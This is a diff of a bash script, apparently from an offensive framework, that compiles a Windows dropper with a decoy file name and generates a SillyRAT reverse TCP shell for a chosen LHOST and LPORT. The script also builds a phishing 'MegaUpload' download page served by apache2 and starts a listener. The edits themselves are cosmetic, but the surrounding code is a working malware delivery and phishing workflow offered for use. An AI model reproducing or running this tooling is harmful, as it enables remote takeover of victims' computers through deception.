@@ -13166,12 +13166,10 @@ if [ "$?" -ne "0" ]; then
       echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
       echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
       ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
-      GCClib="mingw-W64"
    else
       echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
       echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
       ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
-      GCClib="mingw32"
    fi
 fi
 
@@ -13203,7 +13201,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-SOSP=$(zenity --list --title "☠ Target Operative System sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -13250,23 +13248,22 @@ if [ "$SOSP" = "Windows" ]; then
    sed -i "s|TempDir|$rpath|g" dropper.c
 
    ## COMPILING C Program USING mingw32 OR mingw-W64
-   echo "${BlueF}[☠]${white} Compiling dropper using $GCClib."${Reset};sleep 2
+   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
    # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
    $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
    rm $IPATH/output/dropper.c > /dev/nul 2>&1
 fi
 
 
+cd $IPATH/bin/SillyRAT
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
-cd $IPATH/bin/SillyRAT
 xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
 
 
-cd $IPATH
+cd $IPATH/templates/phishing
 ## Building 'the Download Webpage' in HTML
 echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
-cd $IPATH/templates/phishing
 sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
 mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 
@@ -13292,6 +13289,7 @@ echo "${BlueF}- SYSINFO: systeminfo|findstr /C \"Host OS Manufacturer Type\""
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
 read stupidpause
+
 
 cd $IPATH/output
 ## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
